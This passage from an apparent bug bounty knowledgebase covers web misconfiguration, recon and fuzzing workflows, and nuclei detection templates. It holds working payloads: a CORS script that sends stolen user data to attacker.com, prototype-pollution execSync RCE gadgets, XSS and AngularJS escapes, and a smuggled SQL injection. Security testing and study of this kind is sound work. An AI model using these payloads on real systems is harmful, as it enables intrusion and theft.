// Fetch with custom headers that might confuse parsers
fetch('/api/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': '0',
    'Transfer-Encoding': 'chunked'
  },
  body: '0

GET /admin HTTP/1.1

'
});
```

### Safari/WebKit Quirks

```javascript
// WebKit handles certain Unicode characters differently
// Zero-width spaces, RTL overrides, etc.
```

### Firefox Quirks

```javascript
// Firefox is more lenient with malformed headers
// and certain CORS edge cases
```

### CORS Misconfiguration Exploitation

```http
# Wildcard origin with credentials
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# Reflected origin with credentials
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

# Null origin
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Subdomain wildcard
Access-Control-Allow-Origin: https://*.target.com
# Attacker controls anysubdomain.target.com
```

**Exploitation:**
```javascript
// Steal data via CORS
fetch('https://target.com/api/user', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(data)));
});
```

### postMessage Misconfiguration

```javascript
// Insecure postMessage target
window.parent.postMessage(data, '*');

// Insecure origin check
window.addEventListener('message', e => {
  if (e.origin.includes('target.com')) {  // Bypass: attacker.target.com
    process(e.data);
  }
});

// No origin check at all
window.addEventListener('message', e => {
  process(e.data);
});
```

**Gadget for postMessage exploitation:**
```javascript
// Open target in iframe and intercept messages
var win = window.open('https://target.com/vulnerable-page');
setTimeout(() => {
  win.postMessage({action: 'getCredentials'}, '*');
}, 2000);
```

---

## Gadget Chains

### Client-Side Prototype Pollution

**Detection:**
```javascript
// Check for prototype pollution
if (Object.prototype.polluted === 'test') {
  console.log('Vulnerable to prototype pollution');
}

// Common injection points
?__proto__[polluted]=test
?__proto__.polluted=test
?constructor[prototype][polluted]=test
?__proto__[constructor][prototype][polluted]=test
```

**Gadgets:**
```javascript
// jQuery $.ajax gadget (CVE-2019-11358)
?__proto__[url]=//attacker.com&__proto__[dataType]=script

// Lodash merge gadget
?__proto__[sourceURL]=
alert(1)//

// Express.js + ejs gadget
?__proto__[outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');var xx

# Full ejs RCE gadget
?__proto__[outputFunctionName]=x;process.mainModule.require('child_process').execSync('calc');var xx
```

### DOM Clobbing to XSS

```html
<!-- If application uses innerHTML with id references -->
<a id=x href="javascript:alert(1)">
<form id=x action="javascript:alert(1)">
<img id=x src=x onerror=alert(1)>
```

**Exploitation:**
```html
<!-- Inject into page -->
<a id=defaultAvatar><a id=defaultAvatar name=href href="javascript:alert(1)">

<!-- If code does: someElement.defaultAvatar.href -->
```

### AngularJS Sandbox Escapes (Legacy)

```javascript
// Angular 1.0.1 - 1.0.2
{{constructor.constructor('alert(1)')()}}

// Angular 1.2.0 - 1.2.1
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// Angular 1.2.2 - 1.2.5
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x=alert(1)")}}
```

---

## Real World Case Studies

### Case Study 1: Git Exposure Leading to Full Compromise

**Target**: E-commerce platform  
**Finding**: `.git` directory exposed  
**Impact**: Full source code, database credentials, API keys  

**Chain:**
1. `curl https://target.com/.git/HEAD` → confirmed exposure
2. `git-dumper https://target.com/.git/ ./repo`
3. `grep -r "password\|secret\|token" ./repo`
4. Found AWS keys in `config/production.yml`
5. Used keys to access S3 bucket with customer data

### Case Study 2: Spring Boot Actuator to RCE

**Target**: Financial API  
**Finding**: `/actuator/env` and `/actuator/heapdump` exposed  
**Impact**: Database credentials, internal API tokens

**Chain:**
1. `/actuator/env` → Database password in plaintext
2. `/actuator/heapdump` → Downloaded heap
3. `strings heapdump | grep -i "password"` → Found additional secrets
4. Connected to database → Extracted user data

### Case Study 3: Cache Poisoning to Account Takeover

**Target**: Social media platform  
**Finding**: Unkeyed `X-Forwarded-Host` header in cache  
**Impact**: Mass account takeover via poisoned JavaScript

**Chain:**
1. `GET /api/user` with `X-Forwarded-Host: attacker.com`
2. Response cached with attacker-controlled data
3. Victims loading `/api/user` received malicious JS
4. JS stole session cookies and sent to attacker

### Case Study 4: Request Smuggling to Bypass WAF

**Target**: Banking application  
**Finding**: CL.TE desync between Cloudflare and origin  
**Impact**: SQL injection bypass, data exfiltration

**Chain:**
1. Detected CL.TE using `http-request-smuggler`
2. Smuggled request: `GET /api/users?id=1' UNION SELECT * FROM passwords--`
3. Front-end WAF saw benign outer request
4. Back-end executed malicious inner request

---

## Fuzzing Payloads

### Web Content Discovery

```bash
# ffuf - comprehensive
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt   -e .php,.html,.js,.txt,.zip,.sql,.env,.xml,.json,.yaml,.yml,.bak,.old,.swp,.tmp   -t 100 -mc 200,204,301,302,307,401,403,405,500

# ffuf - recursive
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# dirsearch
python3 dirsearch.py -u https://target.com -e php,html,js,zip,sql,bak,old,swp,tmp -t 100

# gobuster
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt   -x php,html,js,txt,zip,sql,bak,old
```

### Parameter Fuzzing

```bash
# GET parameter discovery
ffuf -u https://target.com/page?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# POST parameter discovery
ffuf -u https://target.com/api -X POST -d 'FUZZ=test'   -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt   -H "Content-Type: application/x-www-form-urlencoded"

# JSON parameter fuzzing
ffuf -u https://target.com/api -X POST -d '{"FUZZ":"test"}'   -w params.txt -H "Content-Type: application/json"
```

### Value Fuzzing

```bash
# Fuzz parameter values for SSTI, SQLi, XSS
ffuf -u https://target.com/page?id=FUZZ   -w /usr/share/seclists/Fuzzing/template-engines-expression.txt   -fr "Invalid"

# Fuzz headers
ffuf -u https://target.com/ -H "X-Custom: FUZZ" -w payloads.txt
```

### Backup File Fuzzing

```bash
# Generate backup extensions
for ext in php html js asp aspx jsp do py rb; do
  for suffix in ~ .bak .old .orig .save .swp .tmp .copy .txt .zip .tar.gz; do
    echo "index.$ext$suffix"
  done
done > backup_extensions.txt

ffuf -u https://target.com/FUZZ -w backup_extensions.txt -mc 200
```

---

## Automation Workflows

### Full Recon Automation Pipeline

```bash
#!/bin/bash
# full_recon.sh

TARGET=$1
OUTPUT_DIR="output/$TARGET"
mkdir -p $OUTPUT_DIR

# 1. Subdomain enumeration
subfinder -d $TARGET -all -o $OUTPUT_DIR/subdomains.txt
assetfinder --subs-only $TARGET >> $OUTPUT_DIR/subdomains.txt
amass enum -d $TARGET -o $OUTPUT_DIR/amass.txt
cat $OUTPUT_DIR/amass.txt >> $OUTPUT_DIR/subdomains.txt
sort -u $OUTPUT_DIR/subdomains.txt -o $OUTPUT_DIR/subdomains.txt

# 2. Probe for live hosts
httpx -l $OUTPUT_DIR/subdomains.txt   -title -tech-detect -status-code -follow-redirects   -o $OUTPUT_DIR/live_hosts.txt

# 3. Port scanning
naabu -list $OUTPUT_DIR/subdomains.txt -top-ports 1000 -o $OUTPUT_DIR/ports.txt

# 4. Screenshot
cat $OUTPUT_DIR/live_hosts.txt | cut -d' ' -f1 | aquatone -out $OUTPUT_DIR/screenshots/

# 5. Content discovery
ffuf -u https://$TARGET/FUZZ   -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt   -e .php,.html,.js,.txt,.zip,.sql,.env,.xml,.json,.bak,.old,.swp,.tmp   -t 100 -o $OUTPUT_DIR/ffuf.json

# 6. Nuclei scanning
nuclei -l $OUTPUT_DIR/live_hosts.txt   -t http/exposures/   -t http/default-logins/   -t http/misconfiguration/   -t http/vulnerabilities/   -o $OUTPUT_DIR/nuclei.txt

# 7. Git exposure check
for domain in $(cat $OUTPUT_DIR/subdomains.txt); do
  curl -s -o /dev/null -w "%{http_code}" https://$domain/.git/HEAD && echo " $domain"
done > $OUTPUT_DIR/git_exposure.txt

# 8. Technology-specific checks
# WordPress
wpscan --url https://$TARGET -e ap,at,tt,cb,dbe,u1-10 --api-token YOUR_TOKEN

# 9. Secret scanning
trufflehog filesystem $OUTPUT_DIR/ 2>/dev/null
```

### Continuous Monitoring Workflow

```bash
#!/bin/bash
# monitor.sh - Run via cron every hour

TARGET=$1
LAST_STATE="state/$TARGET.last"
CURRENT_STATE="state/$TARGET.current"

# Get current state
httpx -u $TARGET -json -o $CURRENT_STATE

# Compare with last state
diff $LAST_STATE $CURRENT_STATE > changes.txt

if [ -s changes.txt ]; then
  # Notify on changes
  notify -data changes.txt -bulk
  mv $CURRENT_STATE $LAST_STATE
fi
```

### Nuclei Automation

```bash
# Run all relevant templates
nuclei -l targets.txt   -t http/exposures/   -t http/default-logins/   -t http/misconfiguration/   -t http/vulnerabilities/   -t http/takeovers/   -severity critical,high,medium   -o nuclei_results.txt

# Specific template categories
nuclei -l targets.txt -t http/exposures/backups/
nuclei -l targets.txt -t http/exposures/configs/
nuclei -l targets.txt -t http/exposures/logs/
nuclei -l targets.txt -t http/exposures/apis/
nuclei -l targets.txt -t http/exposed-panels/
```

---

## Recon Methodology

### Phase 1: Asset Discovery

```bash
# 1. Root domain enumeration
# - WHOIS lookup
# - Certificate Transparency logs (crt.sh, Censys)
# - DNS brute force

# 2. Subdomain enumeration
dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 3. Permutation/alteration
alterx -l subdomains.txt -pp wordlist.txt

# 4. Resolution and filtering
cat subdomains.txt | dnsx -a -resp-only
```

### Phase 2: Service Enumeration

```bash
# 1. Port scanning
naabu -list ips.txt -p - -o ports.txt

# 2. Service detection
nmap -sV -sC -iL ips.txt -oA nmap_results

# 3. Web technology fingerprinting
httpx -l targets.txt -tech-detect -title -status-code

# 4. CDN/WAF detection
cdncheck -i ips.txt
```

### Phase 3: Content Discovery

```bash
# 1. Directory brute-forcing
ffuf -u https://target.com/FUZZ -w wordlist.txt

# 2. JavaScript analysis
katana -u https://target.com -jc -o js_files.txt
# Analyze JS for endpoints, secrets, S3 buckets, API keys

# 3. Archive analysis
gau target.com | unfurl -u paths | sort -u
waybackurls target.com | unfurl -u paths | sort -u

# 4. Parameter discovery
paramspider -d target.com
```

### Phase 4: Vulnerability Discovery

```bash
# 1. Automated scanning
nuclei -l targets.txt -t templates/

# 2. Manual verification
# - Check for debug endpoints
# - Check for backup files
# - Check for exposed version control
# - Check for default credentials
# - Check for unsafe HTTP methods
# - Check for information disclosure in headers/errors

# 3. Secret scanning
trufflehog git https://github.com/org/repo
gitleaks detect --source . --verbose
```

### Phase 5: Exploitation Chain Building

1. **Map the attack surface**: List all discovered endpoints, technologies, and misconfigurations.
2. **Identify misconfiguration enablers**: Verbose errors, exposed debug pages, CORS misconfig, etc.
3. **Chain vulnerabilities**: Info disclosure → Auth bypass → Data access.
4. **Maximize impact**: Can this lead to account takeover? Data exfiltration? RCE?
5. **Document and report**: Clear reproduction steps, impact assessment, remediation.

---

## Nuclei Templates

### Template Logic for Exposed Panels

```yaml
# Example: Exposed Spring Boot Actuator
id: spring-boot-actuator

info:
  name: Spring Boot Actuator Exposed
  author: pdteam
  severity: medium

http:
  - method: GET
    path:
      - "{{BaseURL}}/actuator"
      - "{{BaseURL}}/actuator/env"
      - "{{BaseURL}}/actuator/health"

    matchers:
      - type: word
        words:
          - ""_links""
          - ""env""
          - ""health""
        condition: or

      - type: status
        status:
          - 200
```

### Template Logic for Backup Files

```yaml
id: backup-file-discovery

info:
  name: Backup File Discovery
  author: custom
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{filename}}.bak"
      - "{{BaseURL}}/{{filename}}.old"
      - "{{BaseURL}}/{{filename}}.zip"
      - "{{BaseURL}}/{{filename}}.tar.gz"
      - "{{BaseURL}}/{{filename}}.sql"

    payloads:
      filename:
        - "index"
        - "backup"
        - "database"
        - "db"
        - "dump"
        - "config"
        - "settings"

    matchers:
      - type: status
        status:
          - 200
      - type: binary
        binary:
          - "504B0304"  # ZIP magic number
          - "1F8B08"    # GZIP magic number
          - "2D2D2D20"  # SQL dump
```

### Template Logic for Git Exposure

```yaml
id: git-exposure

info:
  name: Git Directory Exposure
  author: pdteam
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/.git/HEAD"
      - "{{BaseURL}}/.git/config"

    matchers:
      - type: word
        words:
          - "ref: refs/heads/"
          - "[core]"
        condition: or

      - type: status
        status:
          - 200
```

### Template Logic for Debug Pages

```yaml
id: debug-page-exposure

info:
  name: Debug Page Exposure
  author: custom
  severity: medium

http:
  - method: GET
    path:
      - "{{BaseURL}}/debug"
      - "{{BaseURL}}/phpinfo.php"
      - "{{BaseURL}}/phpinfo"
      - "{{BaseURL}}/trace.axd"
      - "{{BaseURL}}/elmah.axd"

    matchers:
      - type: word
        words:
          - "phpinfo()"
          - "PHP Version"
          - "System"
          - "Trace Information"
          - "ELMAH"
        condition: or

      - type: status
        status:
          - 200
```

### Template Logic for CORS Misconfiguration

```yaml
id: cors-misconfiguration

info:
  name: CORS Misconfiguration
  author: custom
  severity: medium

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      Origin: "https://evil.com"

    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: https://evil.com"
          - "Access-Control-Allow-Credentials: true"
        condition: and

      - type: status
        status:
          - 200
```

---

## Tools and Scanners

### Reconnaissance

| Tool | Purpose | Command |
|------|---------|---------|
| subfinder | Subdomain discovery | `subfinder -d target.com` |
| assetfinder | Subdomain discovery | `assetfinder --subs-only target.com` |
| amass | Deep subdomain enum | `amass enum -d target.com` |
| httpx | Live host probing | `httpx -l subs.txt` |
| naabu | Port scanning | `naabu -list ips.txt` |
| dnsx | DNS toolkit | `dnsx -a -resp-only` |
| alterx | Subdomain permutation | `alterx -l subs.txt` |
| mapcidr | CIDR mapping | `mapcidr -cl ips.txt` |
| asnmap | ASN mapping | `asnmap -org "Target Inc"` |

### Content Discovery

| Tool | Purpose | Command |
|------|---------|---------|
| ffuf | Fast fuzzer | `ffuf -u URL/FUZZ -w wordlist.txt` |
| dirsearch | Directory brute-forcer | `dirsearch -u target.com` |
| gobuster | Directory/file brute-forcer | `gobuster dir -u target.com -w wordlist.txt` |
| katana | Web crawler | `katana -u target.com -jc` |
| gau | GetAllUrls (archive) | `gau target.com` |
| waybackurls | Wayback URLs | `waybackurls target.com` |
| cariddi | URL crawler | `cariddi -url target.com` |

### Vulnerability Scanning

| Tool | Purpose | Command |
|------|---------|---------|
| nuclei | Vulnerability scanner | `nuclei -u target.com -t templates/` |
| CursedChrome | Chrome extension exploitation | N/A (Chrome extension) |
| pp-finder | Prototype pollution finder | `pp-finder -u target.com` |
| postMessage-tracker | postMessage analysis | Browser extension |

### Secret Scanning

| Tool | Purpose | Command |
|------|---------|---------|
| trufflehog | Secret scanner | `trufflehog git https://github.com/org/repo` |
| gitleaks | Secret scanner | `gitleaks detect --source .` |
| gitrob | GitHub org recon | `gitrob org target` |

### Request Smuggling

| Tool | Purpose | Command |
|------|---------|---------|
| http-request-smuggler | Burp extension | Install in Burp Suite |
| smuggler | Standalone smuggling | `python3 smuggler.py -u target.com` |
| param-miner | Burp extension | Install in Burp Suite |

### Cloud Security

| Tool | Purpose | Command |
|------|---------|---------|
| s3scanner | S3 bucket scanner | `python3 s3scanner.py -d target.com` |
| cloud_enum | Cloud resource enum | `python3 cloud_enum.py -k target` |

### Exploitation

| Tool | Purpose | Command |
|------|---------|---------|
| git-dumper | Git repo extraction | `git-dumper https://target.com/.git/ ./repo` |
| svn-extractor | SVN extraction | `svn-extractor --url target.com` |
| ds_store_exp | .DS_Store parser | `python3 -m ds_store` |

---

## Advanced Research

### PortSwigger Research Highlights

#### 1. Cracking the Lens: Targeting HTTPS Hidden Attack Surface
- **Concept**: Infrastructure between client and server (CDNs, WAFs, load balancers) processes requests differently.
- **Techniques**:
  - Absolute URI smuggling: `GET https://attacker.com/ HTTP/1.1`
  - Host header confusion: Multiple `Host` headers
  - Custom method abuse: `GETS`, `POSTS`, etc.
  - Header case sensitivity: `hOsT: attacker.com`

#### 2. HTTP/2 Downgrade Attacks
- HTTP/2 to HTTP/1.1 conversion introduces request smuggling opportunities.
- `:authority` pseudo-header vs `Host` header disagreements.

#### 3. Web Cache Entanglement
- Cache normalization bugs cause different resources to share cache keys.
- Exploitation: Poison one endpoint to affect another.

#### 4. Browser-Powered Desync Attacks
- Browser's connection pooling and request coalescing can be exploited.
- Single-packet attacks: Send entire attack in one TCP packet to avoid race conditions.

#### 5. Practical Web Cache Poisoning
- Systematic approach to finding unkeyed inputs.
- Param Miner (Burp extension) automates unkeyed parameter discovery.

### Top 10 Web Hacking Techniques (2023 Context)
1. **Browser-powered request smuggling**: Client-side desync attacks.
2. **Web cache entanglement**: Advanced cache poisoning.
3. **HTTP/2 continuation floods**: DoS via HTTP/2 CONTINUATION frames.
4. **JWT confusion attacks**: Algorithm substitution.
5. **SSRF via PDF generation**: Server-side request forgery in PDF renderers.
6. **Prototype pollution in server-side JS**: Node.js/RCE chains.
7. **SQL injection via JSON**: PostgreSQL JSON operators.
8. **Race condition attacks**: Limit overrun via race conditions.
9. **XPath injection revival**: Modern XML parsing vulnerabilities.
10. **GraphQL batching attacks**: Query batching for auth bypass.

---

## Bug Bounty Writeups

### Key Findings Patterns

**Information Disclosure → Authentication Bypass:**
1. Debug endpoint (`/actuator/env`) leaks OAuth client secret.
2. Use secret to generate valid OAuth tokens.
3. Access admin functionality.

**Git Exposure → Cloud Compromise:**
1. `.git` exposed on `api.target.com`.
2. Source code reveals AWS role ARN.
3. Assume role via STS, access S3 buckets.

**Backup File → Database Access:**
1. `database.sql.bak` found in root.
2. Contains production database dump.
3. Credentials hashed but some are plaintext or weak.

**CORS Misconfig → Account Takeover:**
1. `Access-Control-Allow-Origin: null` with credentials.
2. Open target in sandboxed iframe with `null` origin.
3. Steal authenticated API responses.

**Cache Poisoning → Mass XSS:**
1. Unkeyed `X-Forwarded-Host` reflected in JSONP callback.
2. Poison cache with malicious callback.
3. All users executing `/api/callback` get XSS.

---

## Payload Collections

### Information Disclosure Payloads

```http
# Header-based
GET / HTTP/1.1
Host: target.com
X-HTTP-Method-Override: TRACE
X-HTTP-Method-Override: OPTIONS

# Error-based
GET /?id=' HTTP/1.1
GET /?id[]= HTTP/1.1
GET /?page=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1

# Path-based
GET /server-status HTTP/1.1
GET /server-info HTTP/1.1
GET /phpinfo.php HTTP/1.1
GET /trace.axd HTTP/1.1
GET /elmah.axd HTTP/1.1
GET /actuator/env HTTP/1.1
GET /actuator/heapdump HTTP/1.1
GET /config.php HTTP/1.1
GET /.env HTTP/1.1
GET /web.config HTTP/1.1
GET /sftp-config.json HTTP/1.1
GET /.vscode/settings.json HTTP/1.1
GET /.idea/workspace.xml HTTP/1.1
```

### Source Code Disclosure Payloads

```http
# PHP
GET /?page=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1
GET /index.php~ HTTP/1.1
GET /index.php.bak HTTP/1.1

# ASP.NET
GET /web.config HTTP/1.1
GET /Global.asax HTTP/1.1
GET /bin/App.dll HTTP/1.1

# Java
GET /WEB-INF/web.xml HTTP/1.1
GET /WEB-INF/classes/App.class HTTP/1.1

# Python
GET /settings.py HTTP/1.1
GET /app.py HTTP/1.1
GET /wsgi.py HTTP/1.1

# Ruby
GET /config/database.yml HTTP/1.1
GET /Gemfile HTTP/1.1
```

### Backup Discovery Payloads

```
/backup.zip
/backup.tar.gz
/backup.sql
/db.sql
/database.sql
/dump.sql
/site.zip
/website.zip
/www.zip
/html.zip
/public_html.zip
/archive.zip
/old.zip
/backup.zip
/back.zip
/backup.rar
/backup.7z
/backup.tar
/backup.tgz
/backup.sql.gz
/dump.sql.gz
/db.sql.gz
/database.sql.gz
/data.sql
```

### Admin Panel Payloads

```
/admin
/administrator
/admin/login
/admin/login.php
/adminpanel
/admin-panel
/admin_area
/adminarea
/admincp
/manager
/management
/console
/dashboard
/backend
/backoffice
/cpanel
/phpmyadmin
/wp-admin
/administrator/
/user/login
/rails_admin
/django-admin
```

### Debug Endpoint Payloads

```
/debug
/phpinfo.php
/phpinfo
/info.php
/test.php
/_profiler/phpinfo
/_profiler/
/actuator
/actuator/env
/actuator/health
/actuator/heapdump
/actuator/httptrace
/actuator/metrics
/actuator/mappings
/trace.axd
/elmah.axd
/server-status
/server-info
/jmx-console
/web-console
/management
/management/env
```

### HTTP Method Testing

```bash
curl -X OPTIONS -i https://target.com/
curl -X PUT -d "test" https://target.com/test.txt
curl -X DELETE https://target.com/test.txt
curl -X TRACE -i https://target.com/
curl -X DEBUG -i https://target.com/
curl -X PATCH -d "test" https://target.com/api/resource
```

---

## Detection Techniques

### Passive Detection

```bash
# Header analysis
curl -sI https://target.com | grep -iE "server|powered|version|via|backend"

# Technology fingerprinting
whatweb https://target.com
wappalyzer https://target.com

# Certificate analysis
curl -sv https://target.com 2>&1 | grep -i "subject\|issuer\|altname"

# DNS analysis
dig +short target.com
dig +short ANY target.com
dig +short TXT target.com
```

### Active Detection

```bash
# Error-based detection
curl -s https://target.com/?id=' | grep -i "error\|warning\|exception\|stack trace"

# Debug page detection
for endpoint in /phpinfo.php /trace.axd /elmah.axd /actuator/env /debug; do
  status=$(curl -s -o /dev/null -w "%{http_code}" https://target.com$endpoint)
  echo "$endpoint: $status"
done

# Backup file detection
for ext in .bak .old .zip .tar.gz .sql; do
  status=$(curl -s -o /dev/null -w "%{http_code}" https://target.com/index.php$ext)
  echo "index.php$ext: $status"
done

# Git exposure detection
curl -s https://target.com/.git/HEAD | grep "ref:"
curl -s https://target.com/.git/config | grep "\[core\]"

# Method testing
curl -X OPTIONS -s -o /dev/null -w "%{http_code}" https://target.com/
curl -X PUT -s -o /dev/null -w "%{http_code}" https://target.com/test.txt
curl -X DELETE -s -o /dev/null -w "%{http_code}" https://target.com/test.txt
```

### Automated Detection

```bash
# Nuclei for misconfigurations
nuclei -u target.com -t http/exposures/
nuclei -u target.com -t http/misconfiguration/
nuclei -u target.com -t http/default-logins/

# Nuclei for specific issues
nuclei -u target.com -t http/exposures/configs/git-config.yaml
nuclei -u target.com -t http/exposures/backups/backup-files.yaml
nuclei -u target.com -t http/misconfiguration/springboot-actuator.yaml
nuclei -u target.com -t http/exposed-panels/
```

---

## References

### PortSwigger Resources
- Web Security Academy: Information Disclosure - https://portswigger.net/web-security/information-disclosure
- Exploiting Information Disclosure - https://portswigger.net/web-security/information-disclosure/exploiting
- Lab: Infoleak in Error Messages - https://portswigger.net/web-security/information-disclosure/lab-infoleak-in-error-messages
- Lab: Version Control History - https://portswigger.net/web-security/information-disclosure/lab-version-control-history
- Lab: Debug Page - https://portswigger.net/web-security/information-disclosure/lab-debug-page
- Lab: Source Code Disclosure via Backup Files - https://portswigger.net/web-security/information-disclosure/lab-source-code-disclosure-via-backup-files
- Lab: Authentication Bypass via Information Leak - https://portswigger.net/web-security/information-disclosure/lab-authentication-bypass-via-information-leak
- Lab: Internal Path Disclosure - https://portswigger.net/web-security/information-disclosure/lab-internal-path-disclosure
- Research: Cracking the Lens - https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface
- Research: Top 10 Web Hacking Techniques of 2023 - https://portswigger.net/research/top-10-web-hacking-techniques-of-2023
- Research: Browser-Powered Desync Attacks - https://portswigger.net/research/browser-powered-desync-attacks
- Research: Web Cache Entanglement - https://portswigger.net/research/web-cache-entanglement
- Research: Practical Web Cache Poisoning - https://portswigger.net/research/practical-web-cache-poisoning
- Research: HTTP/1 Must Die - https://portswigger.net/research/http1-must-die

### GitHub Resources
- PayloadsAllTheThings - Methodology - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
- PayloadsAllTheThings - Source Code Disclosure - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Source%20Code%20Disclosure
- TruffleHog - https://github.com/trufflesecurity/trufflehog
- GitLeaks - https://github.com/gitleaks/gitleaks
- Gitrob - https://github.com/michenriksen/gitrob
- Bug Bounty Misconfigurations - https://github.com/0xspade/bugbounty/tree/master/misconfigurations
- Nuclei Templates - Exposed Panels - https://github.com/projectdiscovery/nuclei-templates/tree/main/http/exposed-panels
- Nuclei Templates - Exposures - https://github.com/projectdiscovery/nuclei-templates/tree/main/http/exposures
- Nuclei - https://github.com/projectdiscovery/nuclei
- httpx - https://github.com/projectdiscovery/httpx
- katana - https://github.com/projectdiscovery/katana
- subfinder - https://github.com/projectdiscovery/subfinder
- interactsh - https://github.com/projectdiscovery/interactsh
- notify - https://github.com/projectdiscovery/notify
- uncover - https://github.com/projectdiscovery/uncover
- dnsx - https://github.com/projectdiscovery/dnsx
- naabu - https://github.com/projectdiscovery/naabu
- mapcidr - https://github.com/projectdiscovery/mapcidr
- asnmap - https://github.com/projectdiscovery/asnmap
- cdncheck - https://github.com/projectdiscovery/cdncheck
- tlsx - https://github.com/projectdiscovery/tlsx
- alterx - https://github.com/projectdiscovery/alterx
- Param Miner - https://github.com/PortSwigger/param-miner
- HTTP Request Smuggler - https://github.com/PortSwigger/http-request-smuggler
- smuggler - https://github.com/defparam/smuggler
- CursedChrome - https://github.com/mandatoryprogrammer/CursedChrome
- Client-Side Prototype Pollution - https://github.com/BlackFan/client-side-prototype-pollution
- postMessage-tracker - https://github.com/fransr/postMessage-tracker
- pp-finder - https://github.com/yeswehack/pp-finder
- cariddi - https://github.com/edoardottt/cariddi
- SecLists - Discovery/Web-Content - https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
- SecLists - Fuzzing - https://github.com/danielmiessler/SecLists/tree/master/Fuzzing

### Wiki and Documentation
- HackTricks - Infoleaks - https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/infoleaks.html
- OWASP Top 10 2017 A6 - https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration
- MDN HTTP Status Codes - https://developer.mozilla.org/en-US/docs/Web/HTTP/Status
- MDN Server Header - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server
- MDN HTTP Caching - https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching

### Medium/Writeups
- Security Misconfiguration and Information Disclosure Guide - https://infosecwriteups.com/security-misconfiguration-and-information-disclosure-guide-5d2f4c7b1e3a
- Advanced Security Misconfiguration and Source Disclosure Techniques - https://medium.com/@filedescriptor/advanced-security-misconfiguration-and-source-disclosure-techniques-2f4d7c1b5e3d

---

## Quick Reference Card

### Most Critical Checks (5-Minute Assessment)

```bash
# 1. Check for exposed version control
curl -s https://target.com/.git/HEAD | grep "ref:"
curl -s https://target.com/.svn/entries | head

# 2. Check for backup files
for ext in .bak .old .zip .tar.gz .sql; do
  curl -s -o /dev/null -w "%{http_code}" https://target.com/index.php$ext
done

# 3. Check for debug endpoints
for endpoint in /actuator/env /phpinfo.php /trace.axd /debug; do
  curl -s -o /dev/null -w "%{http_code}" https://target.com$endpoint
done

# 4. Check HTTP methods
curl -X OPTIONS -s https://target.com/ | grep -i "allow:"

# 5. Check headers for info disclosure
curl -sI https://target.com | grep -iE "server|powered|version|via"

# 6. Check for common admin panels
for path in /admin /wp-admin /administrator /manager /login; do
  curl -s -o /dev/null -w "%{http_code}" https://target.com$path
done

# 7. Check for .env and config files
for file in /.env /config.php /web.config /settings.py; do
  curl -s -o /dev/null -w "%{http_code}" https://target.com$file
done

# 8. Check for cloud buckets
for bucket in target target-media target-assets target-backup; do
  curl -s -o /dev/null -w "%{http_code}" https://$bucket.s3.amazonaws.com/
done
```

### Severity Classification

| Finding | Severity | CVSS Range |
|---------|----------|------------|
| Exposed `.git` with secrets | Critical | 9.0-10.0 |
| Backup file with production data | Critical | 9.0-10.0 |
| Spring Boot actuator with heapdump | Critical | 8.0-9.0 |
| S3 bucket with PII | Critical | 9.0-10.0 |
| Admin panel with default creds | High | 7.0-8.0 |
| Verbose errors with stack traces | Medium | 5.0-6.0 |
| Source code disclosure (no secrets) | Medium | 5.0-6.0 |
| CORS misconfiguration | Medium | 5.0-6.0 |
| Exposed debug page (no sensitive data) | Low | 3.0-4.0 |
| Server header disclosure | Info | 0.0-2.0 |

---

*This knowledgebase is a living document. Update it as new research, tools, and techniques emerge in the bug bounty and security testing landscape.*
